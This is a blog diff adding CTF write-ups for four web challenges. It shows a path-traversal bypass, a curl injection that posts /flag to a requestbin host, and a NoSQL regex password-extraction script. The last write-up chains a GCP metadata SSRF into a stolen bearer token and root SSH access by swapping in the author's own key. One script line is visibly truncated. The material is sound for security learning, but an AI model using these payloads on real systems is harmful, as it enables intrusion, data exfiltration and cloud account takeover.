@@ -8,13 +8,20 @@ layout: post
 
 ## Team Placing: 210 / 2735
 
-This was honestly one of my favorite CTFs for the Spring semester despite playing solo for most of the week (finals were coming up). The forensics challenges were a ton of fun and very interesting to me, and I also enjoyed a lot of the web exploitation challenges.
+This was honestly one of my favorite CTFs for the Spring semester despite playing solo for most of the week (finals were coming up). The forensics challenges were a ton of fun and very interesting to me, and I also enjoyed a lot of the web exploitation challenges. Some of my favorite challenges were [Invitation](#challenge-invitation) which involved deobfuscating a malicious macro in a Word document, and [gcloud pwn](#challenge-gcloud-pwn) which involved exploiting a server side request forgery (SSRF) vulnerability in a web application hosted on Google Cloud services.
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/HTB%20Cyber%20Apocalypse%20Certificate.jpg)
 
 ## Categories
 * ### Forensics
     * #### [Invitation](#challenge-invitation)
     * #### [Oldest trick in the book](#challenge-oldest-trick-in-the-book)
     * #### [AlienPhish](#challenge-alienphish)
+* ### Web
+    * #### [MiniSTRyplace](#challenge-ministryplace)
+    * #### [cURL as a Service (CaaS)](#challenge-curl-as-a-service-caas)
+    * #### [Wild Goose Hunt](#challenge-wild-goost-hunt)
+    * #### [gcloud pwn](#challenge-gcloud-pwn) 
     * More writeups soon!
 
 -------------------------------------------------------------------------------
@@ -558,3 +565,409 @@ Nice, that looks like the flag! I initially just tried submitting `CHTB{pH1sHiNg
 ![](/assets/img/writeups/HTBCyberApocalypse2021/AlienPhish%20Writeup.005.png)
 
 ### Flag: CHTB{pH1sHiNg_w0_m4cr0s???}
+-----------------------------------------------------------------------------------------------
+
+### Challenge: MiniSTRyplace 
+### Category: Web 
+
+## Description:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/MiniSTRyplace%20Writeup.001.png)
+
+## Walkthrough:
+
+Navigating to the provided URL, we're presented with the following:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/MiniSTRyplace%20Writeup.002.jpg)
+
+Looking at the page source code doesn't yield anything interesting, so let's try clicking the `QW` language change button in the top right. Doing so yields a page that looks like this:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/MiniSTRyplace%20Writeup.003.jpg)
+
+Again, not much interesting on the page but I did notice something with the URL: `http://138.68.148.149:32735/?lang=qw.php`
+
+Interesting, it seems that the website is loading a completely different page, `qw.php`. This made me think of a [directory traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability. However, if we try something like `?lang=../../../../../etc/passwd` it does not work. Since we're given source code for the website let's take a look:
+
+```php
+<?php
+    $lang = ['en.php', 'qw.php'];
+        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
+?>
+```
+
+The vulnerable piece of code is the `str_replace('../, '', $_GET['lang'])` portion. Since the code looks for the `../` string directly, we can bypass it by crafting something like `?lang=....//....//....//etc/passwd`. This works because when the server replaces `../` with `''` in the URL, our payload ends up becoming `?lang=../../../../etc/passwd` which is a valid path.
+
+So let's try navigating to `http://138.68.148.149:32735/?lang=....//....//....//....//etc/passwd`:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/MiniSTRyplace%20Writeup.004.png)
+
+Nice, we have sucessfully exploited the directory traversal vulnerability! Navigating to `http://138.68.148.149:32735/?lang=....//....//....//....//flag` yields the flag:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/MiniSTRyplace%20Writeup.005.png)
+
+### Flag: CHTB{b4d_4li3n_pr0gr4m1ng}
+
+-----------------------------------------------------------------------------------------------
+
+### Challenge: cURL as a Service (CaaS)
+### Category: Web 
+
+## Description:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/caas%20Writeup.001.png)
+
+## Walkthrough:
+
+Navigating to the provided URL, we're presented with the following:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/caas%20Writeup.002.png)
+
+So it looks like the web application just runs `curl` on whatever we pass to it. This challenge could be solved simply by passing `file:///../../flag`. 
+
+I thought I had tried this during the competition but it did not seem to work for me, so I made it a bit more complicated than it had to be but I think the solution is still pretty cool.
+
+So, the web application uses the curl command like so:
+
+```javascript
+<?php
+class CommandModel
+{
+    public function __construct($url)
+    {
+        $this->command = "curl -sL " . escapeshellcmd($url);
+    }
+
+    public function exec()
+    {
+        exec($this->command, $output);
+        return $output;
+    }
+}
+```
+
+I spent some time trying different things to see if I could bypass the `escapeshellcmd` function, but it seemed like everything I tried I would get a `Illegal Characters Detected` message.
+
+So, I took a look at the code where that message was appearing:
+
+```javascript
+var input = document.getElementById('command');
+var output = document.getElementById("console-output");
+
+document.getElementById("command").addEventListener('keydown', (e) => {
+  if (e.keyCode === 13) {
+
+    let host = input.value;
+
+    try {
+      new URL(host);
+    } catch {
+      return output.innerHTML = "Illegal Characters Detected";
+    }
+
+    output.innerHTML = '';
+
+    fetch('/api/curl', {
+      method: 'POST',
+      body: `ip=${host}`,
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      }
+    })
+    .then(resp => resp.json())
+    .then(data => {
+      output.innerHTML = data.message;
+    });
+
+    input.value = '';
+  }
+});
+```
+
+Staring at this long enough, I realized that this error message only appears when the user presses the `enter` key. This means that we can make a post request directly to `/api/curl` and bypass that check.
+
+A normal request to `/api/curl` looked like this:
+
+```bash
+ip=https://uahcyber.club
+```
+
+but now that we've bypassed the check we can supply curl parameters that we weren't able to before and craft something like this:
+
+```bash
+ip=-F flag=@/flag https://requestbin.io/1aw1kui1
+```
+
+This will send a post request with the data in `/flag` as form data to the requestbin link allowing us to see the flag:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/caas%20Writeup.003.png)
+
+### Flag: CHTB{f1le_r3trieval_4s_a_s3rv1ce}
+
+---------------------------------------------------------------------------------------
+
+### Challenge: Wild Goose Hunt 
+### Category: Web 
+
+## Description:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/Wild%20Goose%20Hunt%20Writeup.001.jpg)
+
+## Walkthrough:
+
+Navigating to the provided URL, we're presented with a page that looks like this:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/Wild%20Goose%20Hunt%20Writeup.002.png)
+
+We can try putting in credentials, but as expected we get `Login Failed` as the response.
+
+So let's take a look at the code:
+
+```javascript
+const mongoose = require('mongoose');
+const Schema   = mongoose.Schema;
+
+let User = new Schema({
+	username: {
+		type: String
+	},
+	password: {
+		type: String
+	}
+}, {
+	collection: 'users'
+});
+
+module.exports = mongoose.model('User', User);
+```
+
+The first thing I noticed was that the server is using MongoDB as its database, and since we're only presented with a login page this made me think of [NoSQL Injection](https://www.netsparker.com/blog/web-security/what-is-nosql-injection/)
+
+With that in mind, we can try passing MongoDB operators in field values. From reading other [writeups](https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/), it looks like we can pass the $regex operator like so:
+
+```bash
+username=admin&password[$regex]=C.*
+```
+
+And the server responds with `Login Successful, welcome back admin.`
+
+Nice! So by using the [$regex](https://docs.mongodb.com/manual/reference/operator/query/regex/) operator we can use regular expressions to match the password string thus allowing us to use the `.*` regex to match any string.
+
+using `C.*` as shown above means that the first letter of the password is C which, given the flag format `CHTB{`, means there's a pretty good chance the password for the admin is the flag.
+
+Cool, now we can just craft a script to continually try different characters and built out the password/flag character by character:
+
+```python
+import requests
+import string
+
+url = 'http://138.68.177.159:32663'
+
+# since we know the password is the flag, we can skip the first few letters
+flag = "CHTB{" 
+
+# string of characters, excluding characters like +, *, and & that would break our regular expression
+chars = '_' + string.ascii_letters + string.digits + "!@#$%^()@{}"
+
+# we will restart the loop each time we find a valid character
+restart = True
+
+while restart:
+
+    # set restart to false 
+    restart = False
+
+    # for each character in our chars string
+    for char in chars:
+
+        #  add the character to our current flag
+        payload = flag + 
+        
+        # attempt the post request
+        post_data = {'username': 'admin', 'password[$regex]': payload + '.*'}
+        r = requests.post(url + '/api/login', data=post_data, allow_redirects=False)
+
+        # if we found a valid character
+        if "Login Successful" in r.text:
+            # print the current flag
+            print(payload)
+
+            # set restart to true
+            restart = True
+
+            # update flag with our current payload
+            flag = payload
+
+            # if the login was successful and the character was }, we're done
+            if char == "}":
+                print('Flag:', flag)
+                exit()
+            break
+```
+
+running the script we slowly build out the flag:
+
+```bash
+$ ./hax.py
+
+CHTB{1
+CHTB{1_
+CHTB{1_t
+CHTB{1_th
+CHTB{1_th1
+CHTB{1_th1n
+CHTB{1_th1nk                                                                                  
+CHTB{1_th1nk_                                                                                 
+CHTB{1_th1nk_t                                                                                
+CHTB{1_th1nk_th                                                                               
+CHTB{1_th1nk_the                                                                              
+CHTB{1_th1nk_the_                                                                             
+CHTB{1_th1nk_the_4                                                                            
+CHTB{1_th1nk_the_4l                                                                           
+CHTB{1_th1nk_the_4l1                                                                          
+CHTB{1_th1nk_the_4l1e
+CHTB{1_th1nk_the_4l1en
+CHTB{1_th1nk_the_4l1ens
+CHTB{1_th1nk_the_4l1ens_
+CHTB{1_th1nk_the_4l1ens_h
+CHTB{1_th1nk_the_4l1ens_h4
+CHTB{1_th1nk_the_4l1ens_h4v
+CHTB{1_th1nk_the_4l1ens_h4ve
+CHTB{1_th1nk_the_4l1ens_h4ve_
+CHTB{1_th1nk_the_4l1ens_h4ve_n
+CHTB{1_th1nk_the_4l1ens_h4ve_n0
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_u
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_us
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_use
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0n
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
+Flag: CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
+```
+
+Very cool!
+
+### Flag: CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
+
+---------------------------------------------------------------------------------------
+
+### Challenge: gcloud pwn
+### Category: Web 
+
+## Description:
+
+Unfortunately I forgot to grab the challenge description for this one.
+
+## Walkthrough:
+
+This was definitely my favorite web challenge during the CTF. Unfortunately, I wasn't able to grab many screenshots because I was not aware that the challenge would be unavailable after the competition. But, I'll try my best to explain!
+
+Navigating to the provided URL, we're presented with a page that looks like this:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/gcloud%20pwn%20Writeup.001.png)
+
+If we supply a URL such as `https://google.com` the page returns a PDF of the provided URL.
+
+Based off the name of the challenge I had a hunch that this was going to be a Google Cloud server side request forgery (SSRF) vulnerability similar to challenges I've seen in the past, such as [Watermark as a Service](https://github.com/tlyrs7314/ctf-writeups/tree/main/DiceCTF2021/Watermark-as-a-Service).
+
+The basic idea is that because this web application is hosted on Google Cloud services and serving us pages that it itself navigates to, we can potentially access the Google Cloud metadata API and thus access other goodies such as authorization tokens.
+
+This vulnerability has been found in online services such as [Shopify](https://hackerone.com/reports/341876) and [Vimeo](https://hackerone.com/reports/549882), so this is definitely one of the more real world challenges.
+
+With that understanding, let's see if we can access the metadata API. The default domain for accessing the API is `metadata.google.com` but in order to grab authorization tokens we need to supply this url: 
+
+`http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
+
+The most important thing to note here is that we need to use the legacy `v1beta1` API instead of just `v1` which requires a specific HTTP header.
+
+So let's try supplying the URL:
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/gcloud%20pwn%20Writeup.002.png)
+
+Nice! This is the first piece of the puzzle but before we can start interacting with the API directly, we need a few more details about their setup. 
+
+Specifically we need to know the project name, zone, and instance name. Luckily we can use the `recursive=true` GET parameter to easily leak all of the attributes for the instance:
+
+`http://metadata.google.internal/computeMetadata/v1beta1/instance/?recursive=true`
+
+![](/assets/img/writeups/HTBCyberApocalypse2021/gcloud%20pwn%20Writeup.003.png)
+
+Awesome, parsing the output we find the rest of the pieces:
+
+* Project Name: `essential-hawk-310212`
+* Zone: `us-central1-a`
+* Instance Name: `instance-1`
+
+Now we can interact with the API directly like so:
+
+```bash
+curl https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1 -H "Authorization: Bearer [TOKEN]"
+```
+
+Running that command we get all of the entries for the metadata including the metadata for ssh keys. This is bad news for our target.
+
+We can extract the fingerprint of the metadata entry and then use the `setMetadata` API call to replace the current public SSH to my own public SSH key.
+
+So let's create a new SSH key like so:
+
+```bash
+ssh-keygen -t rsa -f ./.ssh/id_rsa
+```
+
+and then grab the public key:
+
+```bash
+$ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD3Y4ou9JJdCaEcC+dGBBEssZX98aurTypHRYVbkXZxyiIiTlmrAFL8GUq6MpVqNTmMYdaDYd2CibRPrvhXq60UCv2tlTAY83BRV/9p1G8MawABSukgidMCfmNc9Kfqw2soU1LCaVtnkKEoNuKHajevqxxqGHOpp6A0CkIoKdfJ/MhbAykmcKaNsf31zNy38h50mu6EeuKKxuj1Z18nq/1wdIPywDFsQcjji4Ozq706hyEPclpNNgV8p5s+7lLyt0g1unX6rW2epnAM6yb9K0zFjTwmJgW89SXeAcuxXjiKEtxP9b6Rl8WnOftV/kvtFnC6+08o16O0ruX6nY02RGg1 ducky@DESKTOP-BRAQ4MJ
+```
+
+Great now we can inject our public key into the metadata, replacing the current one. There are a few ways to do this, such as using curl, but I opted for using the requests module in Python since it was a bit easier to manipulate:
+
+```python
+import requests
+
+# setMetadata api call
+url = 'https://www.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1/setMetadata'
+
+# authorization headers
+headers = {"Metadata-Flavor": "Google", "Authorization": "Bearer ya29.c.Ko8B-wf5hY1Drq0gIe9YnII_TJ_SDIsl0Da_1cvxdAFltNUfgksFrIlOaLJd0wsVXxAIVAByyOj8Y5Gg91NRLUUQYdQ_pm6BTMeocwZp5k-FbOGUA_SeOOfBnvLNVZPK4bxauVUvLo3F4byb5uHKUOXQ52CXiZd2EDc5A7l9_WQO9Gv6aBiMxsuzoaeiunjJBgg"}
+
+
+data_json = {
+  "fingerprint":"aFVXO1mgu5s=", # fingerprint extracted from https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1
+  "items": [
+    {
+      "key": "sshKeys",
+      # replace the current ssh public key to our own
+      "value": "root:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD3Y4ou9JJdCaEcC+dGBBEssZX98aurTypHRYVbkXZxyiIiTlmrAFL8GUq6MpVqNTmMYdaDYd2CibRPrvhXq60UCv2tlTAY83BRV/9p1G8MawABSukgidMCfmNc9Kfqw2soU1LCaVtnkKEoNuKHajevqxxqGHOpp6A0CkIoKdfJ/MhbAykmcKaNsf31zNy38h50mu6EeuKKxuj1Z18nq/1wdIPywDFsQcjji4Ozq706hyEPclpNNgV8p5s+7lLyt0g1unX6rW2epnAM6yb9K0zFjTwmJgW89SXeAcuxXjiKEtxP9b6Rl8WnOftV/kvtFnC6+08o16O0ruX6nY02RGg1 root"
+    }
+  ]
+}
+
+# post request with our data
+r = requests.post(url, headers=headers, json=data_json)
+print(r.text)
+```
+
+Running the script we successfully inject in our own public key and now we can just SSH into the server with our private key:
+
+```bash
+ssh -i id_rsa root@162.222.183.14
+```
+
+Flag was found in `/root/pdfservice/flag`
+
+### Flag: CHTB{l00k_4t_m3_n0w_I_0wn_4ll_th3_cl0ut!}
